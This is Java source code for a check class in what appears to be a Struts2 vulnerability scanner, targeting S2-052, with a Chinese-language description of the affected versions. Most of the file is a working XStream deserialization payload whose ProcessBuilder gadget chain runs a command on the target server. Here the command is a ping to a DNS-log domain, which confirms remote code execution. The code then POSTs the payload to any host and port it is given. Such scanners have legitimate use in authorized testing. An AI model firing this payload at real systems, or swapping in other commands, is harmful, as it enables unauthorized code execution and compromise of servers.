package struts2scan.payload;

import struts2scan.util.DnsLogClient;
import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.io.IOException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_052 implements Check {
    public String printInfo(){
        String info = "[+] S2-052:影响版本Struts 2.1.2-2.3.33,2.5-2.5.12; POST请求发送数据,不需要参数，没有回显，默认用dnslog检测，但是还是有点不太准";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {

        Map<String,String> headers = new HashMap<String,String>();
        headers.put("Content-Type","application/xml");


        String poc = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n" +
                "        <dataHandler>\n" +
                "          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n" +
                "            <is class=\"javax.crypto.CipherInputStream\">\n" +
                "              <cipher class=\"javax.crypto.NullCipher\">\n" +
                "                <initialized>false</initialized>\n" +
                "                <opmode>0</opmode>\n" +
                "                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n" +
                "                  <iter class=\"javax.imageio.spi.FilterIterator\">\n" +
                "                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n" +
                "                    <next class=\"java.lang.ProcessBuilder\">\n" +
                "                      <command>\n" +
                "                        <string>ping</string>\n" +
                "                        <string>-c</string>\n" +
                "                         <string>2</string>\n" +
                "                         <string>{domain}</string>\n" +
                "                      </command>\n" +
                "                      <redirectErrorStream>false</redirectErrorStream>\n" +
                "                    </next>\n" +
                "                  </iter>\n" +
                "                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n" +
                "                    <method>\n" +
                "                      <class>java.lang.ProcessBuilder</class>\n" +
                "                      <name>start</name>\n" +
                "                      <parameter-types/>\n" +
                "                    </method>\n" +
                "                    <name>foo</name>\n" +
                "                  </filter>\n" +
                "                  <next class=\"string\">foo</next>\n" +
                "                </serviceIterator>\n" +
                "                <lock/>\n" +
                "              </cipher>\n" +
                "              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n" +
                "              <ibuffer></ibuffer>\n" +
                "              <done>false</done>\n" +
                "              <ostart>0</ostart>\n" +
                "              <ofinish>0</ofinish>\n" +
                "              <closed>false</closed>\n" +
                "            </is>\n" +
                "            <consumed>false</consumed>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "  </entry>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "  </entry>\n" +
                "</map>";


        DnsLogClient dc = new DnsLogClient();
        String domain = dc.getDomain();


        poc = poc.replace("{domain}",domain);


        String url = protocol + "://" + host + ":" + port + path;

        try {
            HttpResult result = HttpClient.post(url,poc.getBytes(),headers);
            String rs = dc.getRecords();
            if(rs.indexOf(domain) != -1){
                return true;
            }else  {
                return false;
            }
        }catch (IOException e){
            Thread.sleep(3000);
            String rs = dc.getRecords();
            if(rs.indexOf(domain) != -1){
                return true;
            }else  {
                return false;
            }
        }


    }

}
